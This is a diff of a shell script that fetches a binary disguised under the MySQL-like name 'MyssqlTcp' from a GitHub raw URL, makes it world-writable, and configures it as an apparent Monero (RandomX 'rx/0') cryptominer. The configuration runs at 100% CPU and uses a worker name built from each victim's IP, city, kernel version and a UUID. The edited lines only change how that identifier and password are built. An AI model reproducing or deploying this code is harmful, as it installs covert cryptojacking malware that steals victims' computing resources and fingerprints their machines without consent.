@@ -125,7 +125,7 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
-MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+MEIP=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "query" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/-/g'`
 CITY=`curl http://ip-api.com/json/ | sed 's/,/\n/g' | grep "city" | sed 's/:"/\n/g' | sed '1d' | sed 's/}//g' | sed 's/"//g' | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 UUIP=`uname -v | cut -f1 -d" " | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 UUID=`cat /proc/sys/kernel/random/uuid`
@@ -140,8 +140,8 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS"
 fi
 sed -i 's/"algo": *null,/"algo": "rx/0",/' $HOME/myssqltcp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "love275@gamil'$MEIP'-'$UUIP':'$UUID'.'$CITY''$PASS'",/' $HOME/myssqltcp/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$UUID''$MEIP'-'$UUIP':.'$CITY''$PASS'",/' $HOME/myssqltcp/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$UUID''",/' $HOME/myssqltcp/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/myssqltcp/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/myssqlsys.log'",#' $HOME/myssqltcp/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/myssqltcp/config.json
